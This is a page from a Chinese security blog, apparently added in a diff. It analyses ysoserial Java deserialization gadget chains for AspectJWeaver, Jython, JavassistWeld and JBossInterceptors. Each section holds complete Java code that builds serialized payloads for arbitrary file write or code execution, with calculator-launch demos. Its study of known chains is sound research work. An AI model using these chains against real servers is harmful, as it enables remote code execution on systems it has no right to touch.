@@ -1,0 +1,685 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java 反序列化漏洞（六） - AspectJWeaver/Jython/JavassistWeld/JBossInterceptors | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java 反序列化漏洞（六） - AspectJWeaver/Jython/JavassistWeld/JBossInterceptors
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-11
+              </span>
+              <span>
+                18 min read
+              </span>
+              
+                <a href="https://su18.org/tag/YWv10I0qb/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/mBZEXbIuQ/" class="post-tag">
+                  # 工具
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/ysoserial-su18-6.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="aspectjweaver">AspectJWeaver</h1>
+<p>AspectJ 是 Eclipse 基金组织的开源项目，它是 Java 语言的一个 AOP 实现，是最早、功能比较强大的 AOP 实现之一，对整套 AOP 机制都有较好的实现，很多其他语言的 AOP 实现也借鉴或者采纳了 AspectJ 中的很多设计。在 Java 领域，AspectJ 中的很多语法结构基本上已经成为 AOP 领域的标准。</p>
+<p>本条链是一条任意文件写入的利用链，作者表示：“non RCE”，但是在 <code>AntCTF x D^3CTF</code> 比赛中，由蚂蚁安全非攻实验室和蚂蚁安全光年实验室的师傅们将这条链出在了<a href="https://github.com/Ant-FG-Lab/non_RCE">赛题</a>中，并提出了文件写入-&gt; RCE 的思路：通过任意文件写入漏洞把恶意类写入classpath，再通过某种方式加载、使用该恶意类，触发该恶意类的 static 代码块或执行该恶意类的某个方法，来实现通用的RCE利用。官方 WP 点<a href="https://mp.weixin.qq.com/s/yQ-00YaykUe41S0DdlgoiQ">这里</a>。</p>
+<p>此处我们重点关注 ysoserial 中的反序列化链。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="simplecachestoreablecachingmap">SimpleCache$StoreableCachingMap</h3>
+<p>在 <code>org.aspectj.weaver.tools.cache.SimpleCache</code> 类中定义了一个内部类 StoreableCachingMap，这个类继承了 HashMap，提供了将 Map 中值写入文件中的功能。</p>
+<p>在调用 put 方法向 StoreableCachingMap 中放入值时，会调用 <code>writeToPath</code> 方法将 value 中的值写入到文件中。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1628739208725.png" alt="" loading="lazy"></figure>
+<p>可以看到，路径由 folder 起始，拼接 <code>File.separator</code> 以及 key ，values 是 byte 数组类型的数据。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1628747412487.png" alt="" loading="lazy"></figure>
+<p>这就构成了一个文件写出的 sink 点，使用反射尝试一下，可以成功写入文件。</p>
+<pre><code class="language-java">Class&lt;?&gt;       c           = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);
+Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(String.class, int.class);
+constructor.setAccessible(true);
+HashMap&lt;String, Object&gt; map = (HashMap) constructor.newInstance(&quot;/Users/phoebe/Downloads&quot;, 10000);
+map.put(&quot;123.txt&quot;, &quot;aaa&quot;.getBytes(StandardCharsets.UTF_8));
+</code></pre>
+<p>那么谁能储存并触发这个 StoreableCachingMap 的 put 方法呢？</p>
+<h3 id="lazymap">LazyMap</h3>
+<p>在 CC链中的 <code>org.apache.commons.collections.map.LazyMap</code> 类，我们通过触发其 get 方法来触发 Transformer 的 transform 方法来触发 ChainedTransformer/InvokerTransformer 等后续调用链。</p>
+<p>实际上 LazyMap 在 transform 之后会调用封装的内部 map 的 put 方法将结果保存，这就触发了 put 方法。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1628748889010.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造">攻击构造</h2>
+<p>ysoserial 此链中使用了 HashSet 反序列化来触发 TiedMapEntry 的 hashCode 进一步触发 LazyMap 的 get 方法，在 CC6/CC7 中我们提到，使用 HashSet/HashMap/Hashtable 触发本质上都是一样的。这里使用 HashSet 来触发。</p>
+<pre><code class="language-java">public class AspectJWeaver {
+
+	public static void main(String[] args) throws Exception {
+
+		String fileName    = &quot;123.txt&quot;;
+		String filePath    = &quot;/Users/phoebe/Downloads&quot;;
+		String fileContent = &quot;su18 is here&quot;;
+
+		// 初始化 HashMap
+		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+		// 实例化  StoreableCachingMap 类
+		Class&lt;?&gt;       c           = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(String.class, int.class);
+		constructor.setAccessible(true);
+		Map map = (Map) constructor.newInstance(filePath, 10000);
+
+		// 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
+		Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));
+
+		// 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
+		Map          lazyMap = LazyMap.decorate(map, transformer);
+		TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);
+
+		// entry 放到 HashSet 中
+		HashSet set = SerializeUtil.generateHashSet(entry);
+
+		SerializeUtil.writeObjectToFile(set);
+		SerializeUtil.readFileObject();
+	}
+
+}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>以上就是 AspectJWeaver 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 HashSet 反序列化触发 TiedMapEntry 的 hashCode 方法，再触发 LazyMap 的 get 方法，触发 SimpleCache$StorableCachingMap 的 put 方法调用到 writeToPath 写出文件。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashSet#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.map.LazyMap#get()</code></li>
+<li>chain gadget：<code>com.sun.syndication.feed.impl.ObjectBean#toString()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashSet.readObject()
+    HashMap.put()
+        HashMap.hash()
+            TiedMapEntry.hashCode()
+                TiedMapEntry.getValue()
+                    LazyMap.get()
+                        SimpleCache$StorableCachingMap.put()
+                            SimpleCache$StorableCachingMap.writeToPath()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>aspectjweaver : 1.9.2<br>
+commons-collections : 3.2.2</p>
+</blockquote>
+<h1 id="jython">Jython</h1>
+<p>Jython 是 Python 语言在 Java 中的完全实现。项目地址：https://www.jython.org/</p>
+<p>关于 Jython 的学习教程，可以参考<a href="https://iowiki.com/jython/jython_quick_guide.html">这里</a>。</p>
+<p>有了 Jython 的依赖，就可以在 Java 中动态解析和执行 python 代码，例如使用 execfile 执行任意 python 文件：</p>
+<pre><code class="language-java">// 获取 resources 路径下的 test.py 文件
+String filePath = JythonTest.class.getClassLoader().getResource(&quot;test.py&quot;).getPath();
+// 实例化 PythonInterpreter
+PythonInterpreter interpreter = new PythonInterpreter();
+// execfile 方法执行 python 文件
+interpreter.execfile(filePath);
+</code></pre>
+<p>或者使用 exec 执行 python 源字符串：</p>
+<pre><code class="language-java">// exec 方法在本地名称空间中执行Python源字符串
+interpreter.exec(&quot;import os\nos.system(\&quot;open -a Calculator.app\&quot;)\n&quot;);
+</code></pre>
+<p>或使用 eval 计算并返回结果：</p>
+<pre><code class="language-java">// eval 方法将字符串计算为Python源并返回结果
+PyObject object = interpreter.eval(&quot;1+1&quot;);
+System.out.println(object);
+</code></pre>
+<p>也可以先在命名空间中定义函数，然后进行调用：</p>
+<pre><code class="language-java">// 定义函数并调用，传入参数
+interpreter.exec(&quot;import os\ndef add(a,b):\n    return a+b\n&quot;);
+
+PyFunction fun = (PyFunction) interpreter.get(&quot;add&quot;);
+PyObject   foo = fun.__call__(new PyObject[]{new PyString(&quot;1&quot;), new PyString(&quot;2&quot;)});
+System.out.println(foo);
+</code></pre>
+<p>对于在 Java 上调用其他类型的编程或脚本语言，在之前我们已经见过了 Groovy、BeanShell、Myfaces、Clojure，这些解析库的实现在思路上是有相似之处的，因为都是解释型的执行方式，而对于反序列化漏洞的触发大体上也是类似的。</p>
+<p>在 Jython 中，所有的 Python 对象均为 PyObject，例如字符串类型 PyString，数字型 PyInteger，函数类型 PyFunction，文件类型 PyFile 等等。而 PyObject 实现了 Serializable 接口，这里先来看一下函数类型 PyFunction 的实现。</p>
+<h2 id="前置知识-2">前置知识</h2>
+<h3 id="pyfunction">PyFunction</h3>
+<p><code>org.python.core.PyFunction</code> 是 Jython 中对 python 函数的实现，这个类集成了 PyObject，实现了 InvocationHandler 接口。</p>
+<p>先来了解一下 PyFunction 中几个重要的成员变量：</p>
+<ul>
+<li><code>__name__</code>：python 函数的名字，<code>def aaa()</code> 中的 “aaa”。</li>
+<li><code>func_code</code>：PyCode 对象，是将函数中具体代码对象，实际执行功能的类。</li>
+<li><code>func_globals</code>：PyStringMap 对象，用来保存当前函数所在空间的上下文，用来给函数调用。</li>
+<li><code>objtype</code>：PyType 类型的对象，用来表示该对象的类型。</li>
+</ul>
+<p>在 Jython 中，所有的 python 函数都以 PyFunction 实例的状态存在，如果想要调用这个函数，则需要调用 PyFunction 的 <code>__call__</code> 方法，这个方法有若干个重载方法来接收各种参数以应对种种情况。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1628833586805.png" alt="" loading="lazy"></figure>
+<p>可以发现实际上调用的是 <code>this.func_code</code> 的 call 方法，也就是 PyCode 实例是实际上代表了一段代码段（函数）。</p>
+<p>于此同时，PyFunction 还实现了 InvocationHandler 接口，会调用  <code>this.__call__</code> 方法，并将传递的 Java 类转为 PyObject 传递给执行方法。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1628833894280.png" alt="" loading="lazy"></figure>
+<p>也就是说，如果以 PyFunction 作为 InvocationHandler 来动态代理一个接口，则会实际上返回这个 PyFunction 所代表的 python 函数的执行结果。</p>
+<h3 id="pybytecode">PyBytecode</h3>
+<p>在 PyFunction 中，我们提到了代表真实 python 代码块并且能够调用的类是 <code>org.python.core.PyCode</code> ，这个类是一个抽象类，定义了一个成员变量 <code>co_name</code> 和一些重载的 <code>call</code> 调用方法。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1628835799736.png" alt="" loading="lazy"></figure>
+<p>PyBaseCode 是 PyCode 的标准实现，它也是一个抽象类，有两个常用的子类 PyBytecode/PyTableCode。</p>
+<p>这两个子类都包含着可执行的 python 代码，但是不同之处在于：</p>
+<ul>
+<li>PyTableCode 中实际的可执行内容储存为 PyFunctionTable 实例和其索引，在调用 PyTableCode 时，会调用 PyFunctionTable 实例的 call_function 方法，实际上是一种引用的，反射调用的方式。</li>
+<li>PyB​​ytecode 中实际的可执行内容储存为 co_code 中，是一个 byte 数组类型的数据，在调用PyB​​ytecode 时会调用 call/interpret/call_function 方法完成函数的调用，是通过 python 字节码直接调用。</li>
+</ul>
+<p>类比 BeanShell 反序列化漏洞的利用方式，我们想到可以使用 PythonInterpreter 解析 python 代码生成的 PyFunction 动态代理 Comparator 的 comparator 方法，使用 PriorityQueue 触发反序列化。但是这其中有两个问题：</p>
+<ul>
+<li>动态生成的 PyFunctionTable 类无法找到。</li>
+<li>一些 python 代码对应的执行类不支持反序列化。</li>
+</ul>
+<p>使用 PythonInterpreter 创建的 PyFunction 中的 PyCode，是 PyTableCode 实例，这里我们发现，其实际可执行内容实例 PyFunctionTable 类是一个抽象类，没有任何子类，那是如何创建和使用的呢？</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1628844071499.png" alt="" loading="lazy"></figure>
+<p>答案在 <code>org.python.core.BytecodeLoader</code> 类的 makeCode 方法。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1628843711243.png" alt="" loading="lazy"></figure>
+<p>makeClass 中调用了 <code>BytecodeLoader.Loader</code> 的 <code>loadClassFromBytes</code>  方法，是使用 ASM 从字节码中动态生成类或使用 defineClass 定义类。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1628844240396.png" alt="" loading="lazy"></figure>
+<p>虽然 PyFunctionTable 是实现了 Serializable 接口的，但是这样动态加载的类无法经过序列化和反序列化流程。对于动态生成的类，反序列化过程使用的 ClassLoader 是无法找到这个类对象的。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1628846186662.png" alt="" loading="lazy"></figure>
+<p>但是我们可以使用 PyB​​ytecode 来替代 PyTableCode 作为 PyFunction 的 PyCode。只需要将恶意 python 代码的字节码初始化到 PyB​​ytecode 中，再使用 PyB​​ytecode 来创建 PyFunction 即可。</p>
+<p>初始化的相关信息可以使用如下代码查看：</p>
+<pre><code class="language-python">def execEvil(a, b):
+    f = open(a, 'w')
+    f.write(b)
+    f.close()
+    execfile(a)
+
+if __name__ == '__main__':
+    print(execEvil.__code__.co_code.encode('hex'))
+    print(execEvil.__code__.co_name)
+    print(execEvil.__code__.co_names)
+    print(execEvil.__code__.co_consts)
+    print(execEvil.__code__.co_varnames)
+    print(execEvil.__code__.co_filename)
+    print(execEvil.__code__.co_argcount)
+    print(execEvil.__code__.co_stacksize)
+    print(execEvil.__code__.co_nlocals)
+    print(execEvil.__code__.co_flags)
+    print(execEvil.__code__.co_lnotab)
+    print(execEvil.__code__.co_firstlineno)
+    print(dis.dis(execEvil.__code__))
+
+</code></pre>
+<p>相关内容可以参考<a href="http://www.xumenger.com/01-python-pyc-20180521/">这篇文章</a>。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1628858095245.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-2">攻击构造</h2>
+<p>在测试反序列化时，又发现了一个新坑，Jython 有一个类 PyReflectedFunction，用来将 Java 函数包装成为 PyObject 对象，用来调用。</p>
+<p>其中就包括 <code>org.python.modules.posix.PosixModule</code> 这个类，在 python 中与操作系统相关操作的包 os 包，在 Jython 将其中的各个方法都映射在了 PosixModule 这个类中，调用时使用 PyReflectedFunction 包裹。</p>
+<p>例如我们想使用 Jython 执行 <code>os.system</code> 执行命令，就要首先 <code>import os</code>，解析对应的依赖时，就会动态生成相关实现代码，而执行命令的具体的实现就会通过 PyReflectedFunction 去反射调用，如下图。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1628849001803.png" alt="" loading="lazy"></figure>
+<p>这个类有个成员变量 ReflectedArgs 数组，用来保存调用相关的参数，而这个对象不能被反序列化，writeObject 时会出错。也就是说，在反序列化执行 payload 的过程中，不能包含带有 PyReflectedFunction 的库，这对我们构造 payload 造成了巨大的限制。</p>
+<p>那该如何执行任意 python 代码呢？ysoserial 的作者利用了 python 的另一个功能突破了这个限制，那就是：<code>execfile()</code>。</p>
+<p>python 提供了 execfile 方法，无需引入任何依赖包，可以执行任意 python 文件，那构造恶意的 payload 逻辑为：</p>
+<pre><code class="language-python">def execEvil(a, b):
+    f = open(a, 'w')
+    f.write(b)
+    f.close()
+    execfile(a)
+
+execEvil(&quot;/Users/phoebe/Downloads/123.py&quot;, &quot;import os\nos.system('open -a Calculator.app')&quot;)
+</code></pre>
+<p>可以看到，先写入恶意 python 文件，再使用 execfile 执行，代码中没有引入任何库，完全绕过了限制。</p>
+<p>所以最终利用代码为：</p>
+<pre><code class="language-java">public class Jython {
+
+	public static void main(String[] args) throws Exception {
+
+		String path = &quot;/Users/phoebe/Downloads/123.py&quot;;
+		String code = &quot;import os\nos.system('open -a Calculator.app')&quot;;
+
+		String pythonByteCode = &quot;7400006401006402008302007D00007C0000690100640300830100017C0000690200830000017403006401008301000164000053&quot;;
+
+		// 初始化参数
+		PyObject[] consts = new PyObject[]{new PyString(&quot;&quot;), new PyString(path), new PyString(&quot;w+&quot;), new PyString(code)};
+		String[]   names  = new String[]{&quot;open&quot;, &quot;write&quot;, &quot;close&quot;, &quot;execfile&quot;};
+
+		// 初始化 PyBytecode
+		PyBytecode bytecode = new PyBytecode(2, 2, 10, 64, &quot;&quot;, consts, names, new String[]{&quot;&quot;, &quot;&quot;}, &quot;noname&quot;, &quot;&lt;module&gt;&quot;, 0, &quot;&quot;);
+		Field      field    = PyBytecode.class.getDeclaredField(&quot;co_code&quot;);
+		field.setAccessible(true);
+		field.set(bytecode, new BigInteger(pythonByteCode, 16).toByteArray());
+
+		// 使用 PyBytecode 初始化 PyFunction
+		PyFunction handler = new PyFunction(new PyStringMap(), null, bytecode);
+
+		// 使用 PyFunction 代理 Comparator
+		Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, handler);
+
+		PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
+		Object[]              queue         = new Object[]{path, code};
+
+		Field queueField = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+		queueField.setAccessible(true);
+		queueField.set(priorityQueue, queue);
+
+		Field sizeField = PriorityQueue.class.getDeclaredField(&quot;size&quot;);
+		sizeField.setAccessible(true);
+		sizeField.set(priorityQueue, 2);
+
+		SerializeUtil.writeObjectToFile(priorityQueue);
+		SerializeUtil.readFileObject();
+
+	}
+}
+</code></pre>
+<h2 id="总结-2">总结</h2>
+<p>以上就是 Jython 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 PriorityQueue 反序列化触发使用 PyFunction 动态代理的 Comparator 的 compare 方法，调用 PyBytecode 的 call 方法触发恶意 python 代码的执行。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>org.python.core.PyBytecode#call()</code></li>
+<li>chain gadget：<code>org.python.core.PyFunction#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    Comparator.compare()
+            XThis$Handler.invoke()
+                PyFunction.invokeImpl()
+                    PyBytecode.call()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>Jython : 1.9.2</p>
+</blockquote>
+<h1 id="javassistweld">JavassistWeld</h1>
+<p>此链是 <a href="http://weld.cdi-spec.org/">Weld</a> 框架中存在的 Gadget，漏洞在 Oracle Weblogic 和 JBoss EAP 中可以利用，并以 Weblogic T3 方序列化漏洞报告给了 Oracle。</p>
+<p>Weld 是 CDI (Java EE 平台上下文和依赖注入) 的参考实现。已经集成到许多 Java EE 应用中，例如 WildFLy、JBoss Enterprise Application Platform 、GlassFish、Oracle WebLogic Server、WebSphere Application Server 等。</p>
+<p>作者关于反序列化的相关 PPT 位于<a href="https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class-deepsec-edition">这里</a>。</p>
+<p>作者在 PPT 中也给出了他的挖掘思路，我们这里跟着学习一下，首先作者提出问题，反序列化中，我们究竟需要找什么？</p>
+<p>第一， sink 点，细一点说，就是能够调用执行恶意的方法，也就是说在可以反序列化的 class 中，找到有如下功能的方法：</p>
+<ul>
+<li>对文件进行操作的方法</li>
+<li>能触发反射调用的方法（method invoke，类中 properties 的 getter/setter 方法）</li>
+<li>触发 native 方法的调用</li>
+<li>等等<br>
+并且这些方法能够从如下方法中被调用：</li>
+<li>readObject</li>
+<li>readResove</li>
+<li>toString</li>
+<li>hashCode</li>
+<li>finalize</li>
+<li>等等其他方法</li>
+</ul>
+<p>在找能够被反序列化的可以用在动态代理中的类</p>
+<ul>
+<li><code>java.lang.reflect.InvocationHandler</code> 的实现</li>
+<li><code>javassist.util.proxy.MethodHandler</code> 的实现类</li>
+</ul>
+<p>并且提到了 ysoserial 作者 Frohoff 的另一个工具 inspector-gadget，使用 graph database 来寻找调用链挖掘 gadget 。</p>
+<p>PPT 中又提到了漏洞执行的两个点：</p>
+<ul>
+<li>TemplatesImpl 的 newTransformer 触发恶意类字节码的加载</li>
+<li>InitialContext 的 lookup 触发 JNDI 注入/JdbcRowSetImpl 的 execute 方法</li>
+</ul>
+<p>除此之外，还有使用脚本语言触发的链：</p>
+<ul>
+<li>javascript : Rhino/Nashorn</li>
+<li>Groovy</li>
+<li>BeanShell</li>
+<li>等</li>
+</ul>
+<p>最后又介绍了 Jenkins 反序列化的利用和绕过，从 CC 到 JRMPListener gadget，再到修改 JSON1 使用 LdapAttribute 绕过黑名单。（这里在后面再说）</p>
+<p>其实跟到目前为止学习和掌握的技术差不多。接下来来看这条链。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="interceptormethodhandler">InterceptorMethodHandler</h3>
+<p><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code> 类是这条链的核心类，也是触发类，这个类实现了 javassist 中的 MethodHandler 接口，实现了 invoke 方法，用来对方法进行调用。同时实现了 Serializable 接口，可以被反序列化。</p>
+<p>这个类用来在反射调用方法时来对其进行功能性上的增强，位于 <code>executeInterception</code> 方法。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1629698564117.png" alt="" loading="lazy"></figure>
+<p>方法从 interceptionModel 属性中获取全部的 InterceptorMetadata 对象列表，然后循环遍历和封装，最后初始化成为 SimpleInterceptionChain 对象，然后以职责链模式执行全部的 InterceptorInvocation。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1629699046145.png" alt="" loading="lazy"></figure>
+<p>SimpleInterceptionChain 的 invokeNextInterceptor 在使用 hasNextInterceptor 判断没有下一个拦截器后，则会根据逻辑反射调用方法。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1629699448319.png" alt="" loading="lazy"></figure>
+<p>接下来看一下 InterceptorMethodHandler 的 readObject 方法，会调用 executeInterception 触发调用。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1629697975932.png" alt="" loading="lazy"></figure>
+<p>后面要做的其实就是满足调用所需要的条件即可。</p>
+<h2 id="攻击构造-3">攻击构造</h2>
+<p>这条链的调用比较无聊（其实是我实在是懒得看了，直接划水），分析过程省略。</p>
+<pre><code class="language-java">public class JavassistWeld {
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		final TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 要反射调用的恶意方法
+		Method method = TemplatesImpl.class.getDeclaredMethod(&quot;newTransformer&quot;);
+
+		ReflectiveClassMetadata metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
+		InterceptorReference    interceptorReference = ClassMetadataInterceptorReference.of(metadata);
+
+		Set&lt;InterceptionType&gt; s = new HashSet&lt;InterceptionType&gt;();
+		s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
+
+		// 使用 DefaultMethodMetadata 构造方法创建 MethodMetadata 实例
+		Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(
+				Set.class, MethodReference.class);
+		defaultMethodMetadataConstructor.setAccessible(true);
+		MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
+				MethodReference.of(method, true));
+
+		List list = new ArrayList();
+		list.add(methodMetadata);
+
+		Map&lt;InterceptionType, List&lt;MethodMetadata&gt;&gt; hashMap = new HashMap&lt;org.jboss.weld.interceptor.spi.model.InterceptionType, List&lt;MethodMetadata&gt;&gt;();
+		hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
+
+		SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(
+				interceptorReference, true, hashMap);
+
+		// 使用 InterceptionModelBuilder 创建 InterceptionModelImpl 实例
+		InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
+		builder.interceptAll().with(simpleInterceptorMetadata);
+		InterceptionModel model = builder.build();
+
+		HashMap map = new HashMap();
+		map.put(&quot;su18&quot;, &quot;su18&quot;);
+
+		DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
+
+		// 返回恶意实例的 InterceptorInstantiator
+		InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
+
+			public Object createFor(InterceptorReference paramInterceptorReference) {
+				return tmpl;
+			}
+		};
+
+		InterceptorMethodHandler interceptorMethodHandler = new InterceptorMethodHandler(
+				map, metadata, model, interceptorInstantiator, factory);
+
+
+		SerializeUtil.writeObjectToFile(interceptorMethodHandler);
+		SerializeUtil.readFileObject();
+
+	}
+}
+</code></pre>
+<h2 id="总结-3">总结</h2>
+<p>以上就是 JavassistWeld 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>InterceptorMethodHandler 的 readObject 触发 executeInterception 方法，会调用 SimpleInterceptionChain 的 invokeNextInterceptor 触发方法调用，执行 TemplatesImpl 的 newTransformer 方法。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler#readObject()</code></li>
+<li>sink gadget：<code>org.jboss.weld.interceptor.proxy.SimpleInterceptionChain#invokeNextInterceptor()</code></li>
+<li>chain gadget：<code>org.jboss.weld.interceptor.proxy.SimpleMethodInvocation#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>InterceptorMethodHandler.readObject()
+    InterceptorMethodHandler.executeInterception()
+            SimpleInterceptionChain.invokeNextInterceptor()
+                SimpleMethodInvocation.invoke()
+                    TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>weld-core : 1.1.33.Final<br>
+javassist : 3.12.1.GA<br>
+cdi-api : 1.0-SP1<br>
+javax.interceptor-api : 3.1<br>
+jboss-interceptor-spi : 2.0.0.Final<br>
+slf4j-api : 1.7.21</p>
+</blockquote>
+<h1 id="jbossinterceptors">JBossInterceptors</h1>
+<p>同 JavassistWeld ，包名不同，不再重复。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#aspectjweaver">AspectJWeaver</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#simplecachestoreablecachingmap">SimpleCache$StoreableCachingMap</a></li>
+<li><a href="#lazymap">LazyMap</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#jython">Jython</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#pyfunction">PyFunction</a></li>
+<li><a href="#pybytecode">PyBytecode</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-2">总结</a></li>
+</ul>
+</li>
+<li><a href="#javassistweld">JavassistWeld</a>
+<ul>
